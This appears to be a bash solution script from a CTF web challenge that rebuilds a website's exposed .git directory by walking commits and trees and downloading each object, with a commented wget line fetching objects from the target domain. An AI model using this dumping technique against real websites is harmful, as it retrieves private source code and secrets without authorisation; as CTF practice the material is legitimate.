#!/bin/bash

function downloadBlob {
	echo downloadBlob $1

	mkdir -p ${1:0:2}
	cd $_

	# wget -q -nc $domain/.git/objects/${1:0:2}/${1:2}
    python /home/philip/workspace/CTF/Web/PasteWeb/sol2.py $1

	cd ..
}

function parseTree {
	echo parseTree $1

	downloadBlob $1

	while read line
	do
		type=$(echo $line | awk '{print $2}')
		hash=$(echo $line | awk '{print $3}')

		[ "$type" = "tree" ] && parseTree $hash || downloadBlob $hash
	done < <(git cat-file -p $1)
}

function parseCommit {
	echo parseCommit $1

	downloadBlob $1

	tree=$(git cat-file -p $1| sed -n '1p' | awk '{print $2}')
	parseTree $tree

	parent=$(git cat-file -p $1 | sed -n '2p' | awk '{print $2}')

	[ ${#parent} -eq 40 ] && parseCommit $parent
}

lasthash='f7fac4b9675f72b3333c732e7ed5a0066d78599d'

cd src

git init

cd .git/objects/

parseCommit $lasthash

cd ../../

echo $lasthash > .git/refs/heads/master

git reset --hard